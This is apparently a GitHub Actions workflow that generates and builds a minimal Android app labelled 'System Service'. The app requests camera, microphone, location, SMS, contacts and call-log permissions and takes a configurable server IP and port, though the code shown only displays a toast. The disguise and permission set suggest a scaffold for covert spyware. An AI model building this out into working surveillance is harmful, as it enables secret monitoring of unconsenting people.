name: Build Android APK

on:
  workflow_dispatch:
    inputs:
      server_ip:
        description: 'Server IP Address'
        required: true
        default: '192.168.0.173'
      server_port:
        description: 'Server Port'
        required: true
        default: '8080'

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Create Android App
        run: |
          # إنشاء مجلدات المشروع
          mkdir -p app/src/main/java/com/example/app
          mkdir -p app/src/main/res/drawable
          
          # AndroidManifest.xml مع الصلاحيات
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.example.app">
              
              <uses-permission android:name="android.permission.INTERNET"/>
              <uses-permission android:name="android.permission.CAMERA"/>
              <uses-permission android:name="android.permission.RECORD_AUDIO"/>
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
              <uses-permission android:name="android.permission.READ_SMS"/>
              <uses-permission android:name="android.permission.READ_CONTACTS"/>
              <uses-permission android:name="android.permission.READ_CALL_LOG"/>
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
              
              <application
                  android:label="System Service"
                  android:icon="@drawable/ic_launcher">
                  <activity android:name=".MainActivity">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          EOF
          
          # إنشاء أيقونة
          cat > app/src/main/res/drawable/ic_launcher.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape android:shape="oval">
              <solid android:color="#3F51B5" />
          </shape>
          EOF
          
          # MainActivity.java
          cat > app/src/main/java/com/example/app/MainActivity.java << 'EOF'
          package com.example.app;
          import android.app.Activity;
          import android.os.Bundle;
          import android.widget.Toast;
          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  String serverIP = "${{ github.event.inputs.server_ip }}";
                  String serverPort = "${{ github.event.inputs.server_port }}";
                  Toast.makeText(this, "Connecting to " + serverIP + ":" + serverPort, Toast.LENGTH_LONG).show();
              }
          }
          EOF
          
          # build.gradle للتطبيق
          cat > app/build.gradle << 'EOF'
          apply plugin: 'com.android.application'
          android {
              compileSdk 30
              defaultConfig {
                  applicationId "com.example.app"
                  minSdk 21
                  targetSdk 30
              }
          }
          EOF
          
          # settings.gradle
          echo "include ':app'" > settings.gradle
          
          # build.gradle الرئيسي
          cat > build.gradle << 'EOF'
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:7.2.2'
              }
          }
          EOF

      - name: Setup Gradle
        run: |
          # إنشاء مجلد Gradle wrapper
          mkdir -p gradle/wrapper
          
          # إنشاء ملف gradle-wrapper.properties
          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
          distributionBase=GRADLE_USER_HOME
          distributionPath=wrapper/dists
          distributionUrl=https\://services.gradle.org/distributions/gradle-7.5-bin.zip
          zipStoreBase=GRADLE_USER_HOME
          zipStorePath=wrapper/dists
          EOF
          
          # تحميل gradle wrapper
          wget https://raw.githubusercontent.com/gradle/gradle/master/gradlew
          wget https://raw.githubusercontent.com/gradle/gradle/master/gradlew.bat
          
          # جعل gradlew قابل للتنفيذ
          chmod +x gradlew
          
          # عرض الملفات للتأكد
          ls -la

      - name: Build APK
        run: |
          ./gradlew assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: my-android-app
          path: app/build/outputs/apk/debug/app-debug.apk
